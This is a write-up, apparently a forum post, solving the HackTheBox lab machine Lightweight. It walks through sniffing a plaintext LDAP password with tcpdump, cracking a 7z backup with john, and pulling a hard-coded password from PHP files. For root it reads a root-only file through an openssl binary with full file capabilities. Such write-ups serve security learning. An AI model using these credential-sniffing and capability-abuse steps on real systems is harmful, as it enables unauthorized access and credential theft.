    <description># HackTheBox Lightweight
Heyo nullers :D
Welcome to my writeup for the recently retired box Lightweight from HackTheBox.
Lightweight was tricky at the beginning. In general, it had:
* Packet sniffing
* LDAP Authentication
* Files&#39; capabilites

Portscan:
Nmap showed three open ports, i.e. ssh, http and ldap
```
Nmap scan report for 10.10.10.119
Host is up (0.61s latency).
Not shown: 997 filtered ports

On port 80:

![port 80](upload://5xTCbRBbgBkYAWlm5WV5XYDKzcO.jpeg)

The user page prompt me to login via ssh with my IP as username and password.
So after doing that ~~and taking a hint from @pry0cc and @guly~~ I just &quot;listened&quot; to the box for as long as I had to. I ran ``tcpdump -i lo -A -w inter.pcap`` on the Lightweight box and then I just browsed the webpage. The status.php was taking quite a time to load, so that was suspicious.

After browsing the website enough, I moved the pcap file to /tmp and transfered it to my local computer with ``scp 10.10.14.200@10.10.10.119:/tmp/inter.pcap .``

Opening the file with wireshark, we find that there is an ldap &quot;bind request&quot; from ldapuser2 with **simple authentication**, meaning that the ldapuser2&#39;s password was in plain sight.

![wire|690x373](upload://fk6bb0LeDUvkUlmVX803wh7yjMW.jpeg) 

By using it we ``su`` to ldapuser2 we get the user flag.

```
su ldapuser2
Password: 
[ldapuser2@lightweight ~]$ ls
backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
[ldapuser2@lightweight ~]$  cat user.txt
8a866d3b*******************
```

In ldapuser2&#39;s home directory we find a backup.7z file. I transfered it to my local machine like the pcap file only to find out that it was password protected. There I used a script I found [here](https://gist.github.com/bcoles/421cc413d07cd9ba7855) which uses john to bruteforce the 7z file. The password was ```delete```

There I found some php files, which are the same from the website, only with a twist:
after running ``cat * | grep user`` in a desparate move for something valueable, I found that the user is ldapuser1, 

```
vict0ni@vict0niLaptop:~/Desktop/CTF/HTB/Lightweight/backup$ cat * | grep username
$username = &#39;ldapuser1&#39;;
```

so the next logical thing to do is to run ``cat * | grep password``, where we find the ldapuser1&#39;s password

```
vict0ni@vic0niLaptop:~/Desktop/CTF/HTB/Lightweight/backup$ cat * | grep password
$password = &#39;f3ca9d298a553da117442deeb6fa932d&#39;;
if ($bind=ldap_bind($ds, $dn, $password)) {
...
...
```

Escalating to ldapuser1, like previously with ldapuser2.

```
[ldapuser2@lightweight ~]$ su ldapuser1
Password: 
[ldapuser1@lightweight ldapuser2]$ whoami
ldapuser1
```

There, root got a bit spoiled to me, because some people where giving away clues inside the box. Specific, one broadcasted the message &quot;openssl is the key&quot;. Kind of a bummer but finding two binaries on the home directory was meaning that the way for root had to do with one of them. So the spoil just saved me a rabbithole. But, please, **don&#39;t** spoil things.

I enumerated the openssl binary I had in front of me. After examing it&#39;s capabilities with ``getcap -r openssl`` the output was ``openssl =ep``, which means that it had access to anything.

So to get the root.txt file, one must grab it with openssl, encrypt it and paste it in a directory, then decrypt it to read it, like ``/home/ldapuser1/openssl enc -base64 -in /root/root.txt -out enc_root`` and then ``base64 -d enc_root``.
And there is the *sweet* root flag :D

```
[ldapuser1@lightweight ~]$ /home/ldapuser1/openssl enc -base64 -in /root/root.txt -out enc_root
[ldapuser1@lightweight ~]$ base64 -d enc_root
f1d4e309c*******************
```

PS: As @PresComm once said: &quot;But if you don&#39;t get a shell and can&#39;t run code, is a system really owned? :thinking:&quot;.
Searching for some way to get a root shell I came across [this](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099) article, where one can rewrite the /etc/shadow file.
